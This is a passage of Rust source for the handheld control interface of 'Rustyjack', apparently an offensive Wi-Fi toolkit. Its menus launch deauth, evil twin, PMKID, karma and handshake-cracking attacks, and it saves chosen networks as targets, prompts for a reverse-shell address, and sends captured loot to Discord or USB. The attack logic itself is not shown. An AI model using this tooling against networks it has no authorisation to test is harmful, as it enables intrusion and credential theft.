use std::{
    fs,
    io::Write,
    path::{Path, PathBuf},
    process::Command,
    thread,
    time::Duration,
};

use anyhow::{Result, bail, Context};
use rustyjack_core::cli::{
    Commands, DiscordCommand, DiscordSendArgs,
    HardwareCommand, LootCommand, LootKind, LootListArgs, 
    LootReadArgs, NotifyCommand, SystemUpdateArgs,
    WifiCommand, WifiDeauthArgs, WifiRouteCommand, WifiScanArgs, 
    WifiStatusArgs, WifiProfileCommand, WifiProfileConnectArgs, WifiProfileDeleteArgs,
};
use rustyjack_core::InterfaceSummary;
use serde::Deserialize;
use serde_json::{self, Value};
use tempfile::{NamedTempFile, TempPath};
use walkdir::WalkDir;
use zip::{CompressionMethod, ZipWriter, write::FileOptions};

use crate::{
    config::GuiConfig,
    core::CoreBridge,
    display::{Display, DashboardView},
    input::{Button, ButtonPad},
    menu::{ColorTarget, LootSection, MenuAction, MenuEntry, MenuTree, PipelineType, TxPowerSetting, menu_title},
    stats::StatsSampler,
};

// Response types for WiFi operations
#[derive(Debug, Deserialize)]
struct WifiNetworkEntry {
    ssid: Option<String>,
    bssid: Option<String>,
    signal_dbm: Option<i32>,
    channel: Option<u8>,
    encrypted: bool,
}

#[derive(Debug, Deserialize)]
struct WifiScanResponse {
    networks: Vec<WifiNetworkEntry>,
    count: usize,
}

#[derive(Debug, Deserialize)]
struct WifiProfileSummary {
    ssid: String,
    #[serde(default)]
    interface: Option<String>,
}

#[derive(Debug, Deserialize)]
struct WifiProfilesResponse {
    profiles: Vec<WifiProfileSummary>,
}

#[derive(Debug, Deserialize)]
struct WifiListResponse {
    interfaces: Vec<InterfaceSummary>,
}

#[derive(Debug, Deserialize)]
struct RouteSnapshot {
    #[serde(default)]
    default_gateway: Option<String>,
    #[serde(default)]
    default_interface: Option<String>,
}

#[derive(Debug, Deserialize)]
struct WifiStatusOverview {
    #[serde(default)]
    connected: bool,
    #[serde(default)]
    ssid: Option<String>,
    #[serde(default)]
    interface: Option<String>,
    #[serde(default)]
    signal_dbm: Option<i32>,
}

pub struct App {
    core: CoreBridge,
    display: Display,
    buttons: ButtonPad,
    config: GuiConfig,
    menu: MenuTree,
    menu_state: MenuState,
    stats: StatsSampler,
    root: PathBuf,
    dashboard_view: Option<DashboardView>,
}

// Map low-level Button values to higher-level ButtonAction values
impl App {
    fn map_button(&self, b: Button) -> ButtonAction {
        match b {
            Button::Up => ButtonAction::Up,
            Button::Down => ButtonAction::Down,
            Button::Left => ButtonAction::Back,
            Button::Right | Button::Select => ButtonAction::Select,
            Button::Key1 => ButtonAction::Refresh,
            Button::Key2 => ButtonAction::MainMenu,
            Button::Key3 => ButtonAction::Reboot,
        }
    }

    fn confirm_reboot(&mut self) -> Result<()> {
        // Ask the user to confirm reboot — waits for explicit confirmation
        let overlay = self.stats.snapshot();
        let content = vec![
            "Confirm reboot".to_string(),
            "SELECT = Reboot".to_string(),
            "LEFT = Cancel".to_string(),
        ];

        self.display.draw_dialog(&content, &overlay)?;

        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select => {
                    // Run reboot command and then exit
                    let _ = Command::new("systemctl").arg("reboot").status();
                    // If the command succeeded the system will reboot; exit the app regardless.
                    std::process::exit(0);
                }
                ButtonAction::Back | ButtonAction::MainMenu => {
                    // Cancel and return
                    break;
                }
                ButtonAction::Refresh => {
                    // redraw the dialog
                    self.display.draw_dialog(&content, &overlay)?;
                }
                _ => {}
            }
        }
        Ok(())
    }
}

struct MenuState {
    stack: Vec<String>,
    selection: usize,
    // Scroll offset for current menu view — ensures selection stays visible
    offset: usize,
}

impl MenuState {
    fn new() -> Self {
        Self {
            stack: vec!["a".to_string()],
            selection: 0,
            offset: 0,
        }
    }

    fn current_id(&self) -> &str {
        self.stack.last().map(|s| s.as_str()).unwrap_or("a")
    }

    fn enter(&mut self, id: &str) {
        self.stack.push(id.to_string());
        self.selection = 0;
        self.offset = 0;
    }

    fn back(&mut self) {
        if self.stack.len() > 1 {
            self.stack.pop();
            self.selection = 0;
            self.offset = 0;
        }
    }

    fn move_up(&mut self, total: usize) {
        if total == 0 {
            self.selection = 0;
            return;
        }
        if self.selection == 0 {
            self.selection = total - 1;
        } else {
            self.selection -= 1;
        }
        // Ensure selection is inside visible window
        const VISIBLE: usize = 7;
        if self.selection < self.offset {
            self.offset = self.selection;
        } else if self.selection >= self.offset + VISIBLE {
            self.offset = self.selection.saturating_sub(VISIBLE - 1);
        }
    }

    fn move_down(&mut self, total: usize) {
        if total == 0 {
            self.selection = 0;
            return;
        }
        self.selection = (self.selection + 1) % total;
        // Ensure selection is inside visible window
        const VISIBLE: usize = 7;
        if self.selection < self.offset {
            self.offset = self.selection;
        } else if self.selection >= self.offset + VISIBLE {
            self.offset = self.selection.saturating_sub(VISIBLE - 1);
        }
    }

    fn home(&mut self) {
        self.stack = vec!["a".to_string()];
        self.selection = 0;
        self.offset = 0;
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ButtonAction {
    Up,
    Down,
    Back,
    Select,
    Refresh,
    MainMenu,
    Reboot,
}

impl App {
    pub fn new() -> Result<Self> {
        let core = CoreBridge::with_root(None)?;
        let root = core.root().to_path_buf();
        let config = GuiConfig::load(&root)?;
        let mut display = Display::new(&config.colors)?;
        let buttons = ButtonPad::new(&config.pins)?;
        
        // Show splash screen during initialization
        let splash_path = root.join("img").join("rustyjack.png");
        let _ = display.show_splash_screen(&splash_path);
        
        // Let splash show while stats sampler starts up
        let stats = StatsSampler::spawn(core.clone());
        
        // Give splash screen time to be visible (1.5 seconds)
        thread::sleep(Duration::from_millis(1500));

        Ok(Self {
            core,
            display,
            buttons,
            config,
            menu: MenuTree::new(),
            menu_state: MenuState::new(),
            stats,
            root,
            dashboard_view: None,
        })
    }

    pub fn run(mut self) -> Result<()> {
        loop {
            if let Some(view) = self.dashboard_view {
                // Dashboard mode
                let status = self.stats.snapshot();
                self.display.draw_dashboard(view, &status)?;
                
                let button = self.buttons.wait_for_press()?;
                match self.map_button(button) {
                    ButtonAction::Back => {
                        // Exit dashboard, return to menu
                        self.dashboard_view = None;
                    }
                    ButtonAction::Select => {
                        // Cycle to next dashboard
                        self.dashboard_view = Some(match view {
                            DashboardView::SystemHealth => DashboardView::AttackMetrics,
                            DashboardView::AttackMetrics => DashboardView::LootSummary,
                            DashboardView::LootSummary => DashboardView::NetworkTraffic,
                            DashboardView::NetworkTraffic => DashboardView::SystemHealth,
                        });
                    }
                    ButtonAction::Refresh => {
                        // force redraw; nothing else required (loop will redraw)
                    }
                    ButtonAction::MainMenu => {
                        self.menu_state.home();
                    }
                    ButtonAction::Reboot => {
                        self.confirm_reboot()?;
                    }
                    _ => {}
                }
            } else {
                // Menu mode
                let entries = self.render_menu()?;
                let button = self.buttons.wait_for_press()?;
                match self.map_button(button) {
                    ButtonAction::Up => self.menu_state.move_up(entries.len()),
                    ButtonAction::Down => self.menu_state.move_down(entries.len()),
                    ButtonAction::Back => self.menu_state.back(),
                    ButtonAction::Select => {
                        if let Some(entry) = entries.get(self.menu_state.selection) {
                            let action = entry.action.clone();
                            self.execute_action(action)?;
                        }
                    }
                    ButtonAction::Refresh => {
                        // Force refresh — nothing required here because the loop redraws
                    }
                    ButtonAction::MainMenu => self.menu_state.home(),
                    ButtonAction::Reboot => self.confirm_reboot()?,
                }
            }
        }
    }

    fn render_menu(&mut self) -> Result<Vec<MenuEntry>> {
        let mut entries = self.menu.entries(self.menu_state.current_id())?;
        
        // Dynamic label updates based on current settings
        for entry in &mut entries {
            match &entry.action {
                MenuAction::ToggleDiscord => {
                    let state = if self.config.settings.discord_enabled { "ON" } else { "OFF" };
                    entry.label = format!("Discord [{}]", state);
                }
                MenuAction::ToggleMacRandomization => {
                    let state = if self.config.settings.mac_randomization_enabled { "ON" } else { "OFF" };
                    entry.label = format!("Auto MAC [{}]", state);
                }
                MenuAction::TogglePassiveMode => {
                    let state = if self.config.settings.passive_mode_enabled { "ON" } else { "OFF" };
                    entry.label = format!("Passive [{}]", state);
                }
                _ => {}
            }
        }

        if entries.is_empty() {
            entries.push(MenuEntry {
                label: " Nothing here".to_string(),
                action: MenuAction::ShowInfo,
            });
        }
        if self.menu_state.selection >= entries.len() {
            self.menu_state.selection = entries.len().saturating_sub(1);
        }
        let status = self.stats.snapshot();
        // When there are more entries than fit on-screen, show a sliding window
        // so the selected item is always visible. MenuState::offset tracks the
        // first item index in the current view.
        const VISIBLE: usize = 7;
        let total = entries.len();
        if self.menu_state.selection >= total && total > 0 {
            self.menu_state.selection = total - 1;
        }
        // clamp offset
        if self.menu_state.offset >= total {
            self.menu_state.offset = 0;
        }

        let start = self.menu_state.offset.min(total);
        let _end = (start + VISIBLE).min(total);

        let labels: Vec<String> = entries
            .iter()
            .skip(start)
            .take(VISIBLE)
            .map(|entry| entry.label.clone())
            .collect();

        // selected index relative to the slice
        let displayed_selected = if total == 0 { 0 } else { self.menu_state.selection.saturating_sub(start) };

        self.display.draw_menu(
            menu_title(self.menu_state.current_id()),
            &labels,
            displayed_selected,
            &status,
        )?;
        Ok(entries)
    }

    fn execute_action(&mut self, action: MenuAction) -> Result<()> {
        match action {
            MenuAction::Submenu(id) => self.menu_state.enter(id),
            MenuAction::RefreshConfig => self.reload_config()?,
            MenuAction::SaveConfig => self.save_config()?,
            MenuAction::SetColor(target) => self.pick_color(target)?,
            MenuAction::RestartSystem => self.restart_system()?,
            MenuAction::Loot(section) => self.show_loot(section)?,
            MenuAction::DiscordUpload => self.discord_upload()?,
            MenuAction::SystemUpdate => self.run_system_update()?,
            MenuAction::ViewDashboards => {
                self.dashboard_view = Some(DashboardView::SystemHealth);
            }
            MenuAction::ToggleDiscord => self.toggle_discord()?,
            MenuAction::TransferToUSB => self.transfer_to_usb()?,
            MenuAction::HardwareDetect => self.show_hardware_detect()?,
            MenuAction::InstallWifiDrivers => self.install_wifi_drivers()?,
            MenuAction::ScanNetworks => self.scan_wifi_networks()?,
            MenuAction::DeauthAttack => self.launch_deauth_attack()?,
            MenuAction::ConnectKnownNetwork => self.connect_known_network()?,
            MenuAction::EvilTwinAttack => self.launch_evil_twin()?,
            MenuAction::ProbeSniff => self.launch_probe_sniff()?,
            MenuAction::PmkidCapture => self.launch_pmkid_capture()?,
            MenuAction::CrackHandshake => self.launch_crack_handshake()?,
            MenuAction::KarmaAttack => self.launch_karma_attack()?,
            MenuAction::AttackPipeline(pipeline_type) => self.launch_attack_pipeline(pipeline_type)?,
            MenuAction::ToggleMacRandomization => self.toggle_mac_randomization()?,
            MenuAction::RandomizeMacNow => self.randomize_mac_now()?,
            MenuAction::RestoreMac => self.restore_mac()?,
            MenuAction::SetTxPower(level) => self.set_tx_power(level)?,
            MenuAction::TogglePassiveMode => self.toggle_passive_mode()?,
            MenuAction::PassiveRecon => self.launch_passive_recon()?,
            MenuAction::ShowInfo => {} // No-op for informational entries
        }
        Ok(())
    }

    fn simple_command(&mut self, command: Commands, success: &str) -> Result<()> {
        if let Err(err) = self.core.dispatch(command) {
            self.show_message("Error", [format!("{err}")])?;
        } else {
            self.show_message("Success", [success.to_string()])?;
        }
        Ok(())
    }

    fn show_message<I, S>(&mut self, title: &str, lines: I) -> Result<()>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let overlay = self.stats.snapshot();
        let content: Vec<String> = std::iter::once(title.to_string())
            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
            .collect();
        // Draw the dialog and require an explicit button press to dismiss
        self.display.draw_dialog(&content, &overlay)?;
        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select | ButtonAction::Back => break,
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    break;
                }
                ButtonAction::Refresh => {
                    // redraw the dialog so user can refresh view content if desired
                    self.display.draw_dialog(&content, &overlay)?;
                }
                ButtonAction::Reboot => {
                    // confirm and perform reboot if accepted
                    self.confirm_reboot()?;
                    break;
                }
                _ => {}
            }
        }
        Ok(())
    }
    
    fn show_progress<I, S>(&mut self, title: &str, lines: I) -> Result<()>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let overlay = self.stats.snapshot();
        let content: Vec<String> = std::iter::once(title.to_string())
            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
            .collect();
        self.display.draw_dialog(&content, &overlay)?;
        Ok(())
    }
    
    fn execute_with_progress<F, T>(&mut self, title: &str, message: &str, operation: F) -> Result<T>
    where
        F: FnOnce() -> Result<T>,
    {
        self.show_progress(title, [message, "Please wait..."])?;
        let result = operation();
        result
    }

    fn reload_config(&mut self) -> Result<()> {
        self.config = GuiConfig::load(&self.root)?;
        self.display.update_palette(&self.config.colors);
        self.show_message("Config", ["Reloaded"])
    }

    fn save_config(&mut self) -> Result<()> {
        self.config.save(&self.root.join("gui_conf.json"))?;
        self.show_message("Config", ["Saved"])
    }

    fn pick_color(&mut self, target: ColorTarget) -> Result<()> {
        // use common, unambiguous hex values so picked colours match names
        let choices = [
            ("White", "#FFFFFF"),
            ("Black", "#000000"),
            ("Green", "#00FF00"),
            ("Red", "#FF0000"),
            ("Blue", "#0000FF"),
            ("Navy", "#000080"),
            ("Purple", "#AA00FF"),
        ];
        let mut index = 0;
        loop {
            let overlay = self.stats.snapshot();
            let (name, hex) = choices[index];
            let label = format!("{:?}: {}", target, name);
            self.display.draw_dialog(&[label.clone()], &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Back => index = (index + choices.len() - 1) % choices.len(),
                ButtonAction::Select => {
                    self.apply_color(target.clone(), hex);
                    self.display
                        .draw_dialog(&["Color updated".into()], &overlay)?;
                    thread::sleep(Duration::from_millis(600));
                    break;
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn apply_color(&mut self, target: ColorTarget, value: &str) {
        match target {
            ColorTarget::Background => self.config.colors.background = value.to_string(),
            ColorTarget::Border => self.config.colors.border = value.to_string(),
            ColorTarget::Text => self.config.colors.text = value.to_string(),
            ColorTarget::SelectedText => self.config.colors.selected_text = value.to_string(),
            ColorTarget::SelectedBackground => {
                self.config.colors.selected_background = value.to_string()
            }
        }
        self.display.update_palette(&self.config.colors);
    }

    fn show_loot(&mut self, section: LootSection) -> Result<()> {
        let kind = match section {
            LootSection::Wireless => LootKind::Wireless,
        };
        let (_, data) = self
            .core
            .dispatch(Commands::Loot(LootCommand::List(LootListArgs { kind })))?;
        let files = data
            .get("files")
            .and_then(Value::as_array)
            .cloned()
            .unwrap_or_default();
        if files.is_empty() {
            return self.show_message("Loot", ["No files"]);
        }
        let mut paths = Vec::new();
        let mut labels = Vec::new();
        for entry in &files {
            if let Some(path) = entry.get("path").and_then(Value::as_str) {
                let display = Path::new(path)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or(path)
                    .to_string();
                paths.push(path.to_string());
                labels.push(display);
            }
        }
        
        // Interactive file browser - keeps looping until user backs out
        loop {
            let Some(index) = self.choose_from_menu("Loot files", &labels)? else {
                return Ok(());
            };
            let path = paths.get(index).cloned().unwrap_or_else(|| paths.first().cloned().unwrap());
            
            // Open the selected file in scrollable viewer
            self.view_loot_file(&path)?;
        }
    }
    
    fn view_loot_file(&mut self, path: &str) -> Result<()> {
        // Read the file with a high line limit
        let read_args = LootReadArgs {
            path: PathBuf::from(path),
            max_lines: 5000,
        };
        let (_, data) = self
            .core
            .dispatch(Commands::Loot(LootCommand::Read(read_args)))?;
        
        let lines = data
            .get("lines")
            .and_then(Value::as_array)
            .map(|arr| {
                arr.iter()
                    .filter_map(Value::as_str)
                    .map(|s| s.to_string())
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();
        
        let truncated = data
            .get("truncated")
            .and_then(Value::as_bool)
            .unwrap_or(false);
        
        if lines.is_empty() {
            return self.show_message("Loot", ["File is empty"]);
        }
        
        let filename = Path::new(path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("file")
            .to_string();
        
        // Scrollable file viewer
        self.scrollable_text_viewer(&filename, &lines, truncated)
    }
    
    fn scrollable_text_viewer(&mut self, title: &str, lines: &[String], truncated: bool) -> Result<()> {
        const LINES_PER_PAGE: usize = 9;
        let total_lines = lines.len();
        let mut offset = 0;
        
        loop {
            let overlay = self.stats.snapshot();
            let end = (offset + LINES_PER_PAGE).min(total_lines);
            let visible_lines: Vec<String> = lines[offset..end].to_vec();
            
            // Build display content with navigation hints
            let mut content = vec![
                format!("{} ({}/{})", title, offset + 1, total_lines),
            ];
            content.extend(visible_lines);
            
            // Add navigation hint
            if offset + LINES_PER_PAGE < total_lines {
                content.push("-- More below --".to_string());
            } else if truncated {
                content.push("[File truncated]".to_string());
            }
            
            self.display.draw_dialog(&content, &overlay)?;
            
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Down => {
                    // Scroll down by one line
                    if offset + LINES_PER_PAGE < total_lines {
                        offset += 1;
                    }
                }
                ButtonAction::Up => {
                    // Scroll up by one line
                    if offset > 0 {
                        offset = offset.saturating_sub(1);
                    }
                }
                ButtonAction::Select => {
                    // Page down
                    if offset + LINES_PER_PAGE < total_lines {
                        offset = (offset + LINES_PER_PAGE).min(total_lines.saturating_sub(LINES_PER_PAGE));
                    }
                }
                ButtonAction::Back => {
                    // Exit viewer and return to file list
                    return Ok(());
                }
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(());
                }
                ButtonAction::Refresh => {
                    // Redraw current page
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
            }
        }
    }

    fn restart_system(&mut self) -> Result<()> {
        Command::new("reboot")
            .status()
            .ok();
        Ok(())
    }

    fn choose_from_list(&mut self, title: &str, items: &[String]) -> Result<Option<usize>> {
        if items.is_empty() {
            return Ok(None);
        }
        let mut index = 0usize;
        loop {
            let overlay = self.stats.snapshot();
            let content = vec![title.to_string(), items[index].clone()];
            self.display.draw_dialog(&content, &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => {
                    if index == 0 {
                        index = items.len() - 1;
                    } else {
                        index -= 1;
                    }
                }
                ButtonAction::Down => index = (index + 1) % items.len(),
                ButtonAction::Select => return Ok(Some(index)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(None);
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
    }

    /// Show a paginated menu (styled like the main menu) and return index
    fn choose_from_menu(&mut self, title: &str, items: &[String]) -> Result<Option<usize>> {
        if items.is_empty() {
            return Ok(None);
        }

        const VISIBLE: usize = 7;
        let mut index: usize = 0;
        let mut offset: usize = 0;

        loop {
            let total = items.len();
            // Clamp offset so selected is visible
            if index < offset {
                offset = index;
            } else if index >= offset + VISIBLE {
                offset = index.saturating_sub(VISIBLE - 1);
            }

            let overlay = self.stats.snapshot();

            // Build window slice of labels
            let slice: Vec<String> = items.iter().skip(offset).take(VISIBLE).cloned().collect();
            // Display menu with selected relative index
            let displayed_selected = index.saturating_sub(offset);
            self.display.draw_menu(title, &slice, displayed_selected, &overlay)?;

            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => {
                    if index == 0 { index = total - 1; } else { index -= 1; }
                }
                ButtonAction::Down => index = (index + 1) % total,
                ButtonAction::Select => return Ok(Some(index)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => { self.menu_state.home(); return Ok(None); }
                ButtonAction::Reboot => { self.confirm_reboot()?; }
                _ => {}
            }
        }
    }

    fn prompt_octet(&mut self, prefix: &str) -> Result<Option<u8>> {
        let mut value: i32 = 1;
        loop {
            let overlay = self.stats.snapshot();
            let content = vec![
                "Reverse shell target".to_string(),
                format!("{prefix}.{}", value.clamp(0, 255)),
                "UP/DOWN to adjust".to_string(),
                "OK to confirm".to_string(),
            ];
            self.display.draw_dialog(&content, &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => value = (value + 1).min(255),
                ButtonAction::Down => value = (value - 1).max(0),
                ButtonAction::Select => return Ok(Some(value as u8)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(None);
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
    }

    fn handle_network_selection(&mut self, network: &WifiNetworkEntry) -> Result<()> {
        let Some(ssid) = network
            .ssid
            .as_deref()
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string())
        else {
            self.show_message("Wi-Fi", ["Hidden SSID - configure via CLI"])?;
            return Ok(());
        };
        let mut details = vec![format!("SSID: {ssid}")];
        if let Some(signal) = network.signal_dbm {
            details.push(format!("Signal: {signal} dBm"));
        }
        if let Some(channel) = network.channel {
            details.push(format!("Channel: {channel}"));
        }
        if let Some(bssid) = network.bssid.as_deref() {
            details.push(format!("BSSID: {bssid}"));
        }
        details.push(if network.encrypted {
            "Encrypted: yes".to_string()
        } else {
            "Encrypted: no".to_string()
        });
        self.show_message("Network", details.iter().map(|s| s.as_str()))?;

        let actions = vec!["Connect".to_string(), "Set as Target".to_string(), "Back".to_string()];
        if let Some(choice) = self.choose_from_list("Network action", &actions)? {
            match choice {
                0 => {
                    // Connect
                    if self.connect_profile_by_ssid(&ssid)? {
                        // message handled in helper
                    } else {
                        let msg = vec![format!("No saved profile for {ssid}")];
                        self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
                    }
                }
                1 => {
                    // Set as Target for deauth attack
                    self.config.settings.target_network = ssid.clone();
                    self.config.settings.target_bssid = network.bssid.clone().unwrap_or_default();
                    self.config.settings.target_channel = network.channel.unwrap_or(0) as u8;
                    
                    // Save config
                    let config_path = self.root.join("gui_conf.json");
                    if let Err(e) = self.config.save(&config_path) {
                        self.show_message("Error", [format!("Failed to save: {}", e)])?;
                    } else {
                        self.show_message("Target Set", [
                            &format!("SSID: {}", ssid),
                            &format!("BSSID: {}", self.config.settings.target_bssid),
                            &format!("Channel: {}", self.config.settings.target_channel),
                            "",
                            "Ready for Deauth Attack"
                        ])?;
                    }
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn handle_profile_selection(&mut self, profile: &WifiProfileSummary) -> Result<()> {
        let actions = vec![
            "Connect".to_string(),
            "Delete".to_string(),
            "Back".to_string(),
        ];
        if let Some(choice) =
            self.choose_from_list(&format!("Profile {}", profile.ssid), &actions)?
        {
            match choice {
                0 => self.connect_named_profile(&profile.ssid)?,
                1 => self.delete_profile(&profile.ssid)?,
                _ => {}
            }
        }
        Ok(())
    }

    fn fetch_wifi_scan(&mut self) -> Result<WifiScanResponse> {
        let args = WifiScanArgs { interface: None };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Scan(args)))?;
        let resp: WifiScanResponse = serde_json::from_value(data)?;
        Ok(resp)
    }

    fn fetch_wifi_profiles(&mut self) -> Result<Vec<WifiProfileSummary>> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::List,
        )))?;
        let resp: WifiProfilesResponse = serde_json::from_value(data)?;
        Ok(resp.profiles)
    }

    fn fetch_wifi_interfaces(&mut self) -> Result<Vec<InterfaceSummary>> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::List))?;
        let resp: WifiListResponse = serde_json::from_value(data)?;
        Ok(resp.interfaces)
    }

    fn fetch_route_snapshot(&mut self) -> Result<RouteSnapshot> {
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Status)))?;
        let resp: RouteSnapshot = serde_json::from_value(data)?;
        Ok(resp)
    }

    fn fetch_wifi_status(&mut self) -> Result<WifiStatusOverview> {
        let args = WifiStatusArgs { interface: None };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Status(args)))?;
        let status: WifiStatusOverview = serde_json::from_value(data)?;
        Ok(status)
    }

    fn connect_profile_by_ssid(&mut self, ssid: &str) -> Result<bool> {
        let profiles = self.fetch_wifi_profiles()?;
        if !profiles.iter().any(|profile| profile.ssid == ssid) {
            return Ok(false);
        }
        self.connect_named_profile(ssid)?;
        Ok(true)
    }

    fn connect_named_profile(&mut self, ssid: &str) -> Result<()> {
        self.show_progress("Wi-Fi", ["Connecting...", ssid, "Please wait"])?;
        
        let args = WifiProfileConnectArgs {
            profile: Some(ssid.to_string()),
            ssid: None,
            password: None,
            interface: None,
            remember: false,
        };
        
        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::Connect(args),
        ))) {
            Ok(_) => {
                let msg = vec![format!("Connected to {ssid}")];
                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("Connection failed:"), format!("{err}")];
                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn delete_profile(&mut self, ssid: &str) -> Result<()> {
        let args = WifiProfileDeleteArgs {
            ssid: ssid.to_string(),
        };
        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::Delete(args),
        ))) {
            Ok(_) => {
                let msg = vec![format!("Deleted {ssid}")];
                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("{err}")];
                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn discord_upload(&mut self) -> Result<()> {
        let (temp_path, archive_path) = self.build_loot_archive()?;
        let args = DiscordSendArgs {
            title: "Rustyjack Loot".to_string(),
            message: Some("Complete loot archive".to_string()),
            file: Some(archive_path.clone()),
            target: None,
            interface: None,
        };
        let result = self.core.dispatch(Commands::Notify(NotifyCommand::Discord(
            DiscordCommand::Send(args),
        )));
        drop(temp_path);
        match result {
            Ok(_) => self.show_message("Discord", ["Loot uploaded"])?,
            Err(err) => {
                let msg = err.to_string();
                self.show_message("Discord", [msg.as_str()])?;
            }
        }
        Ok(())
    }

    fn transfer_to_usb(&mut self) -> Result<()> {
        // Find USB mount point
        let usb_path = match self.find_usb_mount() {
            Ok(path) => path,
            Err(_e) => {
                self.show_message("USB Transfer Error", [
                    "No USB drive detected",
                    "Please insert a USB drive",
                    "and try again"
                ])?;
                return Ok(());
            }
        };
        
        let loot_dir = self.root.join("loot");
        let responder_logs = self.root.join("Responder").join("logs");
        
        if !loot_dir.exists() && !responder_logs.exists() {
            self.show_message("USB Transfer", ["No loot to transfer"])?;
            return Ok(());
        }

        // Collect all files to transfer
        let mut files = Vec::new();
        if loot_dir.exists() {
            for entry in WalkDir::new(&loot_dir) {
                let entry = entry?;
                if entry.file_type().is_file() {
                    files.push(entry.path().to_path_buf());
                }
            }
        }
        if responder_logs.exists() {
            for entry in WalkDir::new(&responder_logs) {
                let entry = entry?;
                if entry.file_type().is_file() {
                    files.push(entry.path().to_path_buf());
                }
            }
        }

        if files.is_empty() {
            self.show_message("USB Transfer", ["No files to transfer"])?;
            return Ok(());
        }

        let total_files = files.len();
        let status = self.stats.snapshot();

        // Transfer files with progress
        for (idx, file_path) in files.iter().enumerate() {
            let progress = ((idx + 1) as f32 / total_files as f32) * 100.0;
            
            let filename = file_path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("file");
            
            self.display.draw_progress_dialog(
                "USB Transfer",
                filename,
                progress,
                &status
            )?;

            // Determine destination path
            let dest = if file_path.starts_with(&loot_dir) {
                let rel = file_path.strip_prefix(&loot_dir).unwrap_or(file_path);
                usb_path.join("Rustyjack_Loot").join("loot").join(rel)
            } else if file_path.starts_with(&responder_logs) {
                let rel = file_path.strip_prefix(&responder_logs).unwrap_or(file_path);
                usb_path.join("Rustyjack_Loot").join("ResponderLogs").join(rel)
            } else {
                continue;
            };

            // Create destination directory
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)?;
            }

            // Copy file
            fs::copy(file_path, &dest)?;
        }

        self.show_message("USB Transfer", [
            &format!("Transferred {} files", total_files),
            "to USB drive"
        ])?;
        
        Ok(())
    }

    fn find_usb_mount(&self) -> Result<PathBuf> {
        // First, find USB block devices by checking /sys/block/
        let usb_devices = self.find_usb_block_devices();
        
        if usb_devices.is_empty() {
            bail!("No USB storage device detected. Please insert a USB drive.");
        }
        
        // Now find mount points for these USB devices
        let mounts = self.read_mount_points()?;
        
        for usb_dev in &usb_devices {
            // Check for partitions (e.g., sda1, sdb1) or the device itself
            for (device, mount_point) in &mounts {
                // Match if device starts with the USB device name (handles partitions)
                // e.g., /dev/sda1 starts with "sda"
                let dev_name = device.strip_prefix("/dev/").unwrap_or(device);
                if dev_name.starts_with(usb_dev) {
                    // Verify it's writable
                    if self.is_writable_mount(Path::new(mount_point)) {
                        return Ok(PathBuf::from(mount_point));
                    }
                }
            }
        }
        
        // Fallback: check common mount points but be more selective
        let mount_points = [
            "/media",
            "/mnt",
            "/run/media",
        ];

        for base in &mount_points {
            let base_path = Path::new(base);
            if !base_path.exists() {
                continue;
            }

            // Iterate through subdirectories (usually named after user or device)
            if let Ok(entries) = fs::read_dir(base_path) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        // For /media and /run/media, check subdirectories too (user folders)
                        if let Ok(sub_entries) = fs::read_dir(&path) {
                            for sub_entry in sub_entries.flatten() {
                                let sub_path = sub_entry.path();
                                if sub_path.is_dir() && self.is_usb_storage_mount(&sub_path) {
                                    return Ok(sub_path);
                                }
                            }
                        }
                        // Also check direct mount
                        if self.is_usb_storage_mount(&path) {
                            return Ok(path);
                        }
                    }
                }
            }
        }

